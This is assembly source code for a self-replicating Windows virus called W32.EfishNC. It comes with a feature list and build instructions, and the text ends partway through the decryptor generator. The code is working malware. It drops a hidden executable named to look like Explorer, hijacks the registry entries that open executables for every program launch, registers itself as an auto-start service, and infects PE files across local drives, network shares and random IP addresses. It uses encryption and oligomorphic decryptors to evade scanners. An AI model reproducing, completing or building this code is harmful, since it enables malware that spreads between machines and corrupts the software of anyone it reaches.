
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[EFISHNC.ASM]컴�
comment ;)
W32.EfishNC by roy g biv

some of its features:
- parasitic resident (own process) infector of PE exe/dll (but not looking at suffix)
- infects files in all directories on all fixed and network drives and network shares
- directory traversal is linked-list instead of recursive to reduce stack size
- enumerates shares on local network and also random IP addresses
- reloc section inserter/last section appender
- runs as service in NT/2000/XP and service process in 9x/Me
- hooks all executable shell\open\command values
- EPO and xlat (unbreakable!) encryption with oligomorphic decryptor
- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are never altered (virus is self-modifying but runs on stack)
- no infect files with data outside of image (eg self-extractors)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel address (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
- plus some new code optimisations that were never seen before :)
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 efishnc
tlink32 /B:400000 /x efishnc,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.486
.model  flat

extern  GetCurrentProcess:proc
extern  WriteProcessMemory:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data

;must be reverse alphabetical order because they are stored on stack
;API names are not present in replications, only in dropper

expnames        db      "WriteProcessMemory"  , 0
                db      "WriteFile"           , 0
                db      "WinExec"             , 0
                db      "SetFileAttributesA"  , 0
                db      "MoveFileA"           , 0
                db      "LoadLibraryA"        , 0
                db      "GlobalFree"          , 0
                db      "GlobalAlloc"         , 0
                db      "GetWindowsDirectoryA", 0
                db      "GetTickCount"        , 0
                db      "GetTempFileNameA"    , 0
                db      "GetFileAttributesA"  , 0
                db      "GetCurrentProcess"   , 0
                db      "DeleteFileA"         , 0
                db      "CreateFileA"         , 0
                db      "CloseHandle"         , 0

regnames        db      "RegSetValueA"      , 0
                db      "RegCreateKeyA"     , 0
                db      "RegCloseKey"       , 0
                db      "OpenSCManagerA"    , 0
                db      "CreateServiceA"    , 0
                db      "CloseServiceHandle", 0

exenames        db      "LoadLibraryA"   , 0
                db      "GlobalAlloc"    , 0
                db      "GetVersion"     , 0
                db      "GetTickCount"   , 0
                db      "GetStartupInfoW", 0
                db      "GetStartupInfoA", 0
                db      "GetCommandLineW", 0
                db      "GetCommandLineA", 0
                db      "ExitProcess"    , 0
                db      "CreateProcessW" , 0
                db      "CreateProcessA" , 0

usrnames        db      "CharNextW", 0
                db      "CharNextA", 0

svcnames        db      "StartServiceCtrlDispatcherA", 0

krnnames        db      "lstrlenW"            , 0
                db      "lstrcpyW"            , 0
                db      "lstrcatW"            , 0
                db      "UnmapViewOfFile"     , 0
                db      "Sleep"               , 0
                db      "SetFileTime"         , 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileAttributesA"  , 0
                db      "SetCurrentDirectoryW", 0
                db      "SetCurrentDirectoryA", 0
                db      "MultiByteToWideChar" , 0
                db      "MapViewOfFile"       , 0
                db      "LoadLibraryA"        , 0
                db      "GlobalFree"          , 0
                db      "GlobalAlloc"         , 0
                db      "GetVersion"          , 0
                db      "GetTickCount"        , 0
                db      "GetFullPathNameW"    , 0
                db      "GetFullPathNameA"    , 0
                db      "GetDriveTypeA"       , 0
                db      "FindNextFileW"       , 0
                db      "FindNextFileA"       , 0
                db      "FindFirstFileW"      , 0
                db      "FindFirstFileA"      , 0
                db      "FindClose"           , 0
                db      "CreateThread"        , 0
                db      "CreateFileW"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileA"         , 0
                db      "CloseHandle"         , 0

sfcnames        db      "SfcIsFileProtected", 0

netnames        db      "WNetOpenEnumW"    , 0
                db      "WNetOpenEnumA"    , 0
                db      "WNetEnumResourceW", 0
                db      "WNetEnumResourceA", 0
                db      "WNetCloseEnum"    , 0

ip9xnames       db      "NetShareEnum", 0

ipntnames       db      "NetShareEnum"    , 0
                db      "NetApiBufferFree", 0

txttitle        db      "EfishNC", 0
txtbody         db      "running...", 0

include efishnc.inc

.code
dropper         label   near
        mov     edx, expcrc_count
        mov     ebx, offset expnames
        mov     edi, offset expcrcbegin
        call    create_crcs
        mov     edx, regcrc_count
        mov     ebx, offset regnames
        mov     edi, offset regcrcbegin
        call    create_crcs
        mov     edx, execrc_count
        mov     ebx, offset exenames
        mov     edi, offset execrcbegin
        call    create_crcs
        mov     edx, usrcrc_count
        mov     ebx, offset usrnames
        mov     edi, offset usrcrcbegin
        call    create_crcs
        mov     edx, svccrc_count
        mov     ebx, offset svcnames
        mov     edi, offset svccrcbegin
        call    create_crcs
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, sfccrc_count
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, netcrc_count
        mov     ebx, offset netnames
        mov     edi, offset netcrcbegin
        call    create_crcs
        mov     edx, ip9xcrc_count
        mov     ebx, offset ip9xnames
        mov     edi, offset ip9xcrcbegin
        call    create_crcs
        mov     edx, ipntcrc_count
        mov     ebx, offset ipntnames
        mov     edi, offset ipntcrcbegin
        call    create_crcs

restore_loc     label   near
        pushad
        enter   0, 0
        jmp     efishnc_inf
        db      decsize - (offset $ - offset restore_loc) dup ('r')
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

create_crcs     proc    near
        imul    ebp, edx, 4

create_loop     label   near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        push    eax
        dec     edx
        jne     create_loop
        mov     eax, esp
        push    ecx
        push    ebp
        push    eax
        push    edi
        call    GetCurrentProcess
        push    eax
        xchg    esi, eax
        call    WriteProcessMemory
        add     esp, ebp
        ret
create_crcs     endp

;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here in infected files
;-----------------------------------------------------------------------------

efishnc_inf     proc    near
        cld                                     ;decryptor can set D flag
        call    walk_seh

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

expcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (expcrc_count + 1) dup (0)
expcrcend       label   near
        dd      offset drop_exp - offset expcrcend + 4
        db      "EfishNC - roy g biv"           ;better, stronger, faster

walk_seh        label   near
        xor     esi, esi
        lods    dword ptr fs:[esi]
        inc     eax

seh_loop        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     seh_loop
        lods    dword ptr [esi]

;-----------------------------------------------------------------------------
;moved label after some data because "e800000000" looks like virus code ;)
;-----------------------------------------------------------------------------

init_findmz     label   near
        inc     eax
        xchg    edi, eax

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expordbase]
        lods    dword ptr [esi]                 ;Ordinal Base
        lea     ebp, dword ptr [eax * 2 + ebx]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        add     ebp, dword ptr [esi]            ;Ordinal Table RVA
        lea     ecx, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export                      ;must find all since WriteProcessMemory() needed to run host

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 4]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi

dispname        label   near
        db      "Explorer", 0

explabel        label   near
        db      "ExpIorer.exe", 0

expsize equ     0d4h
;RLE-based compressed MZ header, PE header, import table, section table
        dd      11111111110000011100001011100000b
        ;       mmmmmmmmmmz   01mmz   02mmm
        db      'M', 'Z', "gdi32.dll", 'P', 'E', 4ch, 1, 1
        dd      00000110000111100001001010010000b
        ;       z   01mz   03mmz   02r   04m
        db      2, 2ch, 10h, 88h
        dd      00000111110100100001001000111110b
        ;       z   01mmmmr   02z   04mz   07mm
        db      0fh, 3, 0bh, 1, 56h, (offset efishnc_exe - offset efishnc_inf + expsize) and 0ffh, ((efishnc_exe - offset efishnc_inf + expsize + 1000h) shr 8) and 0ffh
        dd      00001001010010001011000010100001b
        ;       z   02r   04mz   05mz   02mz   02
        db      0ch, 40h, 10h
        dd      00000110000101010111100001111100b
        ;       z   01mz   02mr   07mz   03mmm
        db      2, 1, 4, "Arc"
        dd      00001010000101000111100000101001b
        ;       z   02mz   03mz   07mz   01r   02
        db      ((efishnc_codeend - offset efishnc_inf + expsize + 1fffh) and not 0fffh) shr 8, expsize, 2
        dd      10000111000011100001110000110101b
        ;       mz   03mz   03mz   03mz   03r  04
        db      1, 1, 1, 1
        dd      10001110101001100101001111001111b
        ;       mz   07r   04mmz   0ar   0er   0e
        db      2, 8, 10h
        dd      00010110000111000010100001101100b
        ;       z   05mz   03mz   02mz   03r   08
        db      10h, ((efishnc_codeend - offset efishnc_inf + expsize + 1ffh) and not 1ffh) shr 8, 1
        dd      00011110000000000000000000000000b
        ;       z   07m
        db      60h
        dd      0
;decompressed data follow.  'X' bytes are set to random value every time
;       db      'M', 'Z'                ;00
;       db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)
;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)
;       dw      14ch                    ;10 04 machine (overload for forwarder chain)
;       dw      1                       ;12 06 number of sections (overload for forwarder chain)
;       dd      2                       ;14 08 date/time stamp (overload for dll name RVA)
;       dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)
;       db      X, X, X, X              ;1c 10 number of symbols
;       dw      88h                     ;20 14 size of optional header
;       dw      30fh                    ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       db      X                       ;26 1a major linker
;       db      X                       ;27 1b minor linker
;       dd      0                       ;28 1c size of code (overload for import table terminator)
;       dd      56h                     ;2c 20 size of init data (overload for import name table RVA)
;       dd      0                       ;30 24 size of uninit data (overload for import name table terminator)
;       dd      offset efishnc_exe - offset efishnc_inf + expsize + 1000h
;                                       ;34 28 entry point
;       db      X, X, X, X              ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      400000h                 ;40 34 image base
;       dd      1000h                   ;44 38 section align
;       dd      200h                    ;48 3c file align
;       db      1, X                    ;4c 40 major os
;       db      X, X                    ;4e 42 minor os
;       db      X, X                    ;50 44 major image
;       db      X, X                    ;52 46 minor image
;       dw      4                       ;54 48 major subsys
;       dw      0                       ;56 4a minor subsys (overload for import name table)
;       db      "Arc", 0                ;58 4c reserved (overload for import name table)
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      expsize                 ;60 54 size of headers
;       dd      0                       ;64 58 checksum
;       dw      2                       ;68 5c subsystem
;       db      X, X                    ;6a 5e dll characteristics
;       dd      1                       ;6c 60 size of stack reserve
;       dd      1                       ;70 64 size of stack commit
;       dd      1                       ;74 68 size of heap reserve
;       dd      1                       ;78 6c size of heap commit
;       db      X, X, X, X              ;7c 70 loader flags
;       dd      2                       ;80 74 number of rva and sizes (ignored by Windows 9x/Me)
;       dd      0                       ;84 78 export
;       db      X, X, X, X              ;88 7c export
;       dd      1008h                   ;8c 80 import
;       dd      0                       ;90 84 import
;       dd      0                       ;94 88 resource
;       db      X, X, X, X              ;98 8c resource
;       db      X, X, X, X, X, X, X, X  ;9c 90 exception
;       db      X, X, X, X, X, X, X, X  ;a4 98 certificate
;       db      X, X, X, X, X, X, X, X  ;ac a0 base reloc (overload for section name)
;       dd      0                       ;b4 a8 debug (overload for virtual size)
;       dd      1000h                   ;b8 ac debug (overload for virtual address)
;       dd      (aligned size of code)  ;bc b0 architecture (overload for file size)
;       dd      1                       ;c0 b4 architecture (overload for file offset)
;       db      X, X, X, X              ;c4 b8 global data (overload for pointer to relocs)
;       db      X, X, X, X              ;c8 bc global data (overload for pointer to line numbers)
;       dd      0                       ;cc c0 tls (overload for reloc table and line numbers)
;       dd      60000000h               ;d0 c4 tls (overload for section characteristics)
;                                       ;d4

drop_exp        label   near
        mov     ebx, esp
        lea     esi, dword ptr [edi + offset explabel - offset drop_exp]
        mov     edi, offset efishnc_codeend - offset efishnc_inf + expsize + 1ffh
                                                ;file size must be > end of last section
        push    edi
        xor     ebp, ebp                        ;GMEM_FIXED
        push    ebp
        call    dword ptr [ebx + expcrcstk.pGlobalAlloc]
        push    eax                             ;GlobalFree
        push    ebp                             ;WriteFile
        push    esp                             ;WriteFile
        push    edi                             ;WriteFile
        push    ebp                             ;CreateFileA
        push    FILE_ATTRIBUTE_HIDDEN           ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        push    eax                             ;CreateFileA
        lea     ecx, dword ptr [eax + 7fh]
        push    ecx                             ;MoveFileA
        push    eax                             ;MoveFileA
        push    eax                             ;GetFileAttributesA
        push    ebp                             ;SetFileAttributesA
        push    eax                             ;SetFileAttributesA
        push    ecx                             ;DeleteFileA
        push    ecx                             ;GetTempFileNameA
        push    ebp                             ;GetTempFileNameA
        push    esp                             ;GetTempFileNameA
        push    eax                             ;GetTempFileNameA
        push    edi                             ;GetWindowsDirectoryA
        push    eax                             ;GetWindowsDirectoryA
        xchg    ebp, eax
        call    dword ptr [ebx + expcrcstk.pGetWindowsDirectoryA]
        lea     edi, dword ptr [ebp + eax - 1]
        call    dword ptr [ebx + expcrcstk.pGetTempFileNameA]
        call    dword ptr [ebx + expcrcstk.pDeleteFileA]
        mov     al, '\'
        scas    byte ptr [edi]
        je      skip_slash
        stos    byte ptr [edi]

;-----------------------------------------------------------------------------
;append exe name, assumes name is 0dh bytes long
;-----------------------------------------------------------------------------

skip_slash      label   near
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    byte ptr [edi], byte ptr [esi]

;-----------------------------------------------------------------------------
;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + expcrcstk.pSetFileAttributesA]
        call    dword ptr [ebx + expcrcstk.pGetFileAttributesA]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        pop     ecx
        pop     eax
        je      skip_move
        push    eax
        push    ecx
        call    dword ptr [ebx + expcrcstk.pMoveFileA]

skip_move       label   near
        call    dword ptr [ebx + expcrcstk.pCreateFileA]
        push    edi                             ;WriteFile
        push    ebx
        xchg    ebp, eax
        call    dword ptr [ebx + expcrcstk.pGetTickCount]
        xchg    ebx, eax
        xor     ecx, ecx

;-----------------------------------------------------------------------------
;decompress MZ header, PE header, section table, import table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        add     eax, eax
        sbb     dl, dl
        and     dl, bl
        shld    ecx, eax, 4
        rol     ebx, cl
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cx, offset efishnc_codeend - offset efishnc_inf
        sub     esi, offset drop_exp - offset efishnc_inf
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     ebx
        push    ebp
        call    dword ptr [ebx + expcrcstk.pWriteFile]
        push    ebp
        call    dword ptr [ebx + expcrcstk.pCloseHandle]
        pop     eax
        push    eax
        inc     ebp
        je      load_regdll                     ;allow only 1 copy to run
        push    0
        push    eax
        call    dword ptr [ebx + expcrcstk.pWinExec]

load_regdll     label   near
        sub     esi, offset efishnc_codeend - offset regdll
        push    esi
        call    dword ptr [ebx + expcrcstk.pLoadLibraryA]
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

regcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (regcrc_count + 1) dup (0)
regcrcend       label   near
        dd      offset reg_file - offset regcrcend + 4

regval  db      'ExpIorer "%1" %*', 0
regkey  db      "\com"                          ;no regedit.com ;)
        db      "\exe"                          ;must be 4 bytes long
        db      "\pif"                          ;hook all executable suffix (except .scr which passes /S)
reg_file        label   near                    ;must follow immediately
        mov     ebx, esp
        mov     ecx, HKEY_LOCAL_MACHINE

;-----------------------------------------------------------------------------
;alter Software\Classes in Local Machine and Current User
;because in Windows 2000/XP, Current User values override Local Machine values
;-----------------------------------------------------------------------------

reg_loopouter   label   near
        lea     ebp, dword ptr [edi + offset regval - offset reg_file]
        sub     edi, offset reg_file - offset regkey
        push    (offset reg_file - offset regkey) shr 2
        pop     esi

reg_loopinner   label   near
        push    ecx
        push    "dna"
        push    "mmoc"
        push    "\nep"
        push    "o\ll"
        push    "ehs\"
        push    "elif"
        push    dword ptr [edi]                 ;comfile, exefile, piffile
        push    "sess"
        push    "alc\"
        push    "eraw"
        push    "tfos"                          ;obfuscated ;)
        mov     eax, esp
        push    eax
        push    eax
        push    ecx
        call    dword ptr [ebx + regcrcstk.rRegCreateKeyA]
        pop     eax
        add     esp, 28h                        ;size software\classes\???file\shell\open\command - 4
        push    eax                             ;RegCloseKey
        push    offset regkey - offset regval
        push    ebp
        push    REG_SZ
        push    0                               ;default value
        push    eax
        call    dword ptr [ebx + regcrcstk.rRegSetValueA]
        call    dword ptr [ebx + regcrcstk.rRegCloseKey]
        scas    dword ptr [edi]
        pop     ecx
        dec     esi
        jne     reg_loopinner
        loopw   reg_loopouter                   ;decrements CX only

;-----------------------------------------------------------------------------
;register as service if NT/2000/XP (recognised but ignored by 9x/Me)
;no start service because code is running already
;-----------------------------------------------------------------------------

        push    SC_MANAGER_CREATE_SERVICE
        push    esi
        push    esi
        call    dword ptr [ebx + regcrcstk.rOpenSCManagerA]
        mov     ecx, dword ptr [ebx + size regcrcstk]
        push    ecx
        push    eax
        push    esi
        push    esi
        push    esi
        push    esi
        push    esi
        push    ecx
        push    esi                             ;SERVICE_ERROR_IGNORE
        push    SERVICE_AUTO_START
        push    SERVICE_WIN32_OWN_PROCESS
        push    esi
        sub     edi, offset reg_file - offset dispname
        push    edi
        add     edi, offset explabel - offset dispname
        push    edi
        push    eax
        call    dword ptr [ebx + regcrcstk.rCreateServiceA]
        push    eax
        call    dword ptr [ebx + regcrcstk.rCloseServiceHandle]
        call    dword ptr [ebx + regcrcstk.rCloseServiceHandle]
        call    dword ptr [ebx + 4 + size regcrcstk + expcrcstk.pGlobalFree]

;-----------------------------------------------------------------------------
;restore host bytes
;-----------------------------------------------------------------------------

        push    eax
        push    esp
        push    decsize
        call    store_restore

orgbytes        label   near
        db      decsize dup (90h)

;-----------------------------------------------------------------------------
;WriteProcessMemory() is best to alter bytes because VirtualProtect() can fail
;-----------------------------------------------------------------------------

store_restore   label   near
        mov     esi, offset restore_loc
        push    esi
        call    dword ptr [ebx + 4 + size regcrcstk + expcrcstk.pGetCurrentProcess]
        push    eax
        call    dword ptr [ebx + 4 + size regcrcstk + expcrcstk.pWriteProcessMemory]

store_popsize   label   near
        add     esp, 'rgb!'
        org     $ - 4
        dd      popsize
        push    esi
        pop     esi
        popad
        jmp     dword ptr [esp - 24h]           ;no stack change in ring 3
                                                ;(except in some debuggers)

;-----------------------------------------------------------------------------
;virus code begins here in dropped exe
;-----------------------------------------------------------------------------

efishnc_exe     label   near
        call    walk_seh

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

execrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (execrc_count + 1) dup (0)
execrcend       label   near
        dd      offset load_user32 - offset execrcend + 4

load_user32     label   near
        call    skip_user32
        db      "user32", 0

skip_user32     label   near
        call    dword ptr [esp + execrcstk.eLoadLibraryA + 4]
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

usrcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (usrcrc_count + 1) dup (0)
usrcrcend       label   near
        dd      offset get_cmdline - offset usrcrcend + 4

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;-----------------------------------------------------------------------------

get_cmdline     label   near
        mov     ebx, esp
        call    dword ptr [ebx + size usrcrcstk + execrcstk.eGetVersion]
        shr     eax, 1fh
        lea     esi, dword ptr [eax * 4 + ebx]

;-----------------------------------------------------------------------------
;RegisterServiceProcess() if 9x/Me (just sets one bit)
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr fs:[tib.TibTeb]
        or      byte ptr [ecx + teb.procflags + 1], al

;-----------------------------------------------------------------------------
;parse command-line in platform-independent way to see how file was run
;-----------------------------------------------------------------------------

        dec     eax
        mov     al, 0ffh
        movzx   edi, ax                         ;ffff if Unicode, 00ff if ANSI
        call    dword ptr [esi + size usrcrcstk + execrcstk.eGetCommandLineW]

stack_delta     label   near
        mov     ebp, dword ptr [eax]
        and     ebp, edi
        cmp     ebp, '"'                        ;Unicode-compatible compare
        je      skip_argv0
        push    ' '
        pop     ebp

skip_argv0      label   near
        push    eax
        call    dword ptr [esi + usrcrcstk.uCharNextW]
        mov     ecx, dword ptr [eax]
        and     ecx, edi
        je      argv1_skip
        cmp     ecx, ebp
        jne     skip_argv0

find_argv1      label   near
        push    eax
        call    dword ptr [esi + usrcrcstk.uCharNextW]
        mov     ecx, dword ptr [eax]
        and     ecx, edi
        cmp     ecx, ' '                        ;Unicode-compatible compare
        je      find_argv1

argv1_skip      label   near

;-----------------------------------------------------------------------------
;if argv1 exists then argv0 was run using shell\open\command so run argv1
;-----------------------------------------------------------------------------

        jecxz   stack_copy
        sub     esp, size processinfo
        mov     edx, esp
        sub     esp, size startupinfo
        mov     ecx, esp
        push    edx
        push    ecx
        xor     edx, edx
        push    edx
        push    edx
        push    edx
        push    edx
        push    edx
        push    edx
        push    eax
        push    edx
        push    ecx
        call    dword ptr [esi + size usrcrcstk + execrcstk.eGetStartupInfoW]
        call    dword ptr [esi + size usrcrcstk + execrcstk.eCreateProcessW]
        call    dword ptr [ebx + size usrcrcstk + execrcstk.eExitProcess]

;-----------------------------------------------------------------------------
;copy to stack and run from there for no write-protection and dynamic resizing
;-----------------------------------------------------------------------------

stack_copy      label   near
        call    dword ptr [ebx + size usrcrcstk.execrcstk.eGetTickCount]
                                                ;RNG seed
        mov     ebx, dword ptr [ebx + size usrcrcstk + execrcstk.eGlobalAlloc]
        mov     esi, 401000h + expsize          ;entry point VA

entrsize        equ ((offset efishnc_codeend - offset efishnc_inf - size usrcrcstk - size execrcstk - 1) and -4) \
                  + ((statelen + 1) shl 2)      ;include RNG cache
if entrsize ge 8192
error code size too large                       ;solution: use another enter after copy
endif
        enter   entrsize, 0
        mov     edi, esp
        push    ebx                             ;save for kernel base later
        mov     ecx, offset efishnc_codeend - offset efishnc_inf
        lea     ebp, dword ptr [edi + offset stack_exec - offset efishnc_inf]
        rep     movs byte ptr [edi], byte ptr [esi]
        jmp     ebp

stack_exec      label   near

;-----------------------------------------------------------------------------
;feersum endjinn - oligomorphic decryptor with random line order
;-----------------------------------------------------------------------------

        call    randinit
        push    decsize + tblsize + grbgsize + tblsize + grbgsize + vsize + randsize + grbgsize
        push    GMEM_ZEROINIT
        call    ebx
        push    eax
        mov     dword ptr [edi + store_decsrc - offset efishnc_codeend + 1], eax
        add     eax, decsize
        mov     ebx, eax
        inc     ah                              ;include old xlat table size
        mov     dword ptr [edi + store_copysrc - offset efishnc_codeend + 1], eax
        push    eax
        xchg    esi, eax
        call    random
        and     eax, grbgsize - 1
        add     esi, eax                        ;table offset
        call    random
        and     eax, grbgsize - 1
        inc     ah                              ;include new xlat table size
        lea     ebp, dword ptr [esi + eax]      ;buffer offset
        call    random
        test    al, 1
        je      init_table
        mov     ebp, esi                        ;buffer offset
        call    random
        and     eax, randsize - 1
        lea     esi, dword ptr [ebp + eax + vsize]
                                                ;table offset

init_table      label   near
        mov     dword ptr [edi + offset store_encdst - offset efishnc_codeend + 1], ebp
        mov     ecx, grbgsize + tblsize + grbgsize + vsize + randsize + grbgsize
        pop     edi

init_buffer     label   near
        call    random
        stos    byte ptr [edi]
        loop    init_buffer

;-----------------------------------------------------------------------------
;bit table is constant time, and much faster than scasb with increasing range
;-----------------------------------------------------------------------------

fill_table      label   near
        call    random
        movzx   eax, al
        bts     dword ptr [ebx - (tblsize shr 3)], eax
        jb      fill_table                      ;already in table
        mov     byte ptr [ebx + ecx], al
        inc     cl
        jne     fill_table                      ;fill with 256 unique values
        pop     edi
        push    ebp                             ;buffer offset

transform       label   near
        mov     al, cl
        xlat    byte ptr [ebx]
        mov     byte ptr [esi + eax], cl
        inc     cl
        jne     transform
        call    random
        and     eax, (randsize - 1) and -4      ;dword align
        mov     ecx, eax                        ;random extra size
        add     ax, small vsize                 ;64kb limit
        mov     ebp, eax                        ;enter size
        add     ax, popsize
        mov     dword ptr [esp + offset store_popsize - offset efishnc_inf + 0ah], eax
        call    random
        and     eax, state_decdown
        xchg    ebx, eax
        call    random
        and     al, state_esifirst
        or      bl, al
        call    random
        and     al, state_pushret
        je      skip_pushb
        or      bl, al
        call    random
        test    bl, state_decdown
        jne     skip_pushb
        and     al, state_pushb
        or      bl, al

skip_pushb      label   near
        call    random
        and     al, state_movesi
        or      bl, al
        call    random
        and     al, state_movedi
        or      bl, al
        call    random
        and     al, state_jg
        or      bl, al
        mov     al, 60h                         ;pushad
        stos    byte ptr [edi]

store_block1    label   near
        call    random
        and     eax, block1and
        cmp     al, block1cmp
        jnb     store_block1
        call    callblock1

;-----------------------------------------------------------------------------
;block 1 contains: mov ebx/esi, lea esi/ebx, enter, mov edi
;std (if down direction) and possibly push (if using ret to jump)

;example 1:
;enter vsize + random size, 0
;std
;mov esi, offset encrypted block end + random size
;push esp
;mov edi, ebp
;lea ebx, dword ptr [esi + offset xlat table]

;example 2:
;mov ebx, offset xlat table
;enter vsize + random size, 0
;lea esi, dword ptr [ebx + offset encrypted block begin]
;mov edi, esp
;-----------------------------------------------------------------------------

procblock1      label   near
        dw      offset storeebx - offset procblock1
        dw      offset storeesi - offset procblock1
        dw      offset storeenter - offset procblock1
        dw      offset storeedi - offset procblock1
        dw      offset storestd - offset procblock1
        dw      offset storepushb - offset procblock1

callblock1      label   near
        pop     edx
        movzx   eax, word ptr [eax * 2 + edx]
        add     eax, edx
        call    eax
        cmp     bh, block1done
        jne     store_block1
        pop     eax
        and     bx, (not state_esifirst) and 0ffh
        mov     ebp, edi                        ;loop label

store_block2    label   near
        call    random
        and     eax, block2and
        cmp     al, block2cmp
        jnb     store_block2
        call    callblock2

;-----------------------------------------------------------------------------
;block 2 contains: load, xlat, store, cmp, branch
;inc esi (if using mov esi), inc edi (if using mov edi)
;possibly push (if using ret to jump) and ret, or jmp esp

;example 1:
;lods byte ptr [esi]
;xlat byte ptr [ebx]
;mov byte ptr [edi], al
;inc edi
;cmp edi, ebp
;jl label
;push esp
;ret

;example 2:
;mov al, byte ptr [esi]
;xlat byte ptr [ebx]
;dec esi
;mov byte ptr [edi], al
;dec edi
;cmp esp, edi
;jle label
;jmp esp
;-----------------------------------------------------------------------------

procblock2      label   near
        dw      offset storelods - offset procblock2
        dw      offset storexlat - offset procblock2
        dw      offset storestos - offset procblock2
        dw      offset storeincs - offset procblock2
        dw      offset storeincd - offset procblock2
        dw      offset storecmp - offset procblock2
        dw      offset storejne - offset procblock2
        dw      offset storepushe - offset procblock2
        dw      offset storeret - offset procblock2

callblock2      label   near
        pop     ecx
        movzx   eax, word ptr [eax * 2 + ecx]
        add     eax, ecx
